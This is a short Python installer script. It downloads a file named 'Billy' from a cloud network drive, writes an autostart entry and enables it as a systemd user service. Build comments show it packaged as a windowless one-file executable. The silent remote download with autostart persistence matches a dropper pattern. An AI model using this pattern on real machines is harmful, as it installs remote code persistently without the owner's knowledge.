import os
import config
from modules import Command, NetworkDrive
import constants


def make_script_executable(path):
    Command.run_command(f"chmod +x {path}")


def create_main_dir():
    if not os.path.isdir(config.main_dir_path):
        os.makedirs(config.main_dir_path, exist_ok=1)


def installBilly():
    NetworkDrive.download(config.Billy_path, config.main_file_path)


def create_autostart_dir():
    if not os.path.isdir(config.startup_dir_path):
        os.makedirs(config.startup_dir_path, exist_ok=1)


def create_autostart_file():
    with open(config.startup_file_path, 'w') as file:
        file.write(config.startup_file_value)


def enable_and_start_main():
    Command.run_command(
        "systemctl --user daemon-reload")

    Command.run_command(
        f"systemctl --user enable {config.startup_file_name}")


def create_autostart():
    create_autostart_dir()
    create_autostart_file()


def main():
    create_main_dir()

    installBilly()

    create_autostart()

    if config.os_name == constants.Linux_OS:
        make_script_executable(config.main_file_path)

        enable_and_start_main()


if __name__ == '__main__':
    main()

# WINDOWS
# pyinstaller --noconsole --hidden-import=yadisk.sessions --hidden-import=yadisk.sessions.requests_session --icon=data/icon.ico --onefile Installer.py

# LINUX
# pyinstaller --add-binary "/usr/lib/x86_64-linux-gnu/libpython3.11.so.1.0:." --paths "$(python3 -c 'import sys; print(sys.prefix)')/lib" --noconsole --hidden-import=yadisk.sessions --hidden-import=yadisk.sessions.requests_session --onefile Installer.py
